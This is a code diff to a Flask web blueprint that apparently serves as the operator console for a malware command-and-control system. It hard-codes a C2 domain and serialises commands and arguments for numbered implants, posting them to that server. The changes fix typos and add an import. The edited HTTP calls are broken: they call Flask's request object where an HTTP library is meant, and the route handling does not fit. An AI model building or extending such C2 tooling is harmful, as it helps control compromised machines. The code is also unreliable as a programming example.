@@ -5,6 +5,8 @@ from wtforms.validators import DataRequired, Length
 import secrets
 from cvnt.client_pb2 import *
 from urllib.parse import urljoin
+from cvnt.client_pb2 import Command, ClientTaskRequest, ClientTaskResponse, Packet
+
 
 client = Blueprint('client', __name__, template_folder='templates')
 c2 = "https://rigamalwarole.com"
@@ -40,7 +42,7 @@ def index():
             #error_message = analyze_input(firstword, leftoverstring)
             handle_t_request(1, msg.cmd, msg.args)
         else:
-            error_message = 'Ivalid Command Loser :('  # Set the error message
+            error_message = 'Invalid Command Loser :('  # Set the error message
     return render_template('index.html', form=form, cmd=whole, error_message=error_message)
 
 def valid_command(cmd):
@@ -63,7 +65,7 @@ def handle_t_request(implant_id, cmd, args):
     r.function = cmd
     r.inputs = args
     out = r.SerializeToString()
-    r = reuqests.post(urljoin( c2, request), data = out)
+    r = request.post(urljoin( c2, request), data = out)
 
 @client.route(response, methods=["POST"])
 def handle_t_response(implant_id, jobID, output):
@@ -73,7 +75,7 @@ def handle_t_response(implant_id, jobID, output):
     r.JobID = jobID
     r.Output = output
     out = r.SerializeToString()
-    r = reuqests.post(urljoin( c2, response), data = out)
+    r = request.post(urljoin( c2, response), data = out)
 
 @client.route(response, methods=["POST"])
 def handle_packet(msg, csrf):
@@ -82,4 +84,4 @@ def handle_packet(msg, csrf):
     r.Message = msg
     r.CSRF = csrf
     out = r.SerializeToString()
-    r = reuqests.post(urljoin( c2, csrf), data = out)
+    r = request.post(urljoin( c2, csrf), data = out)
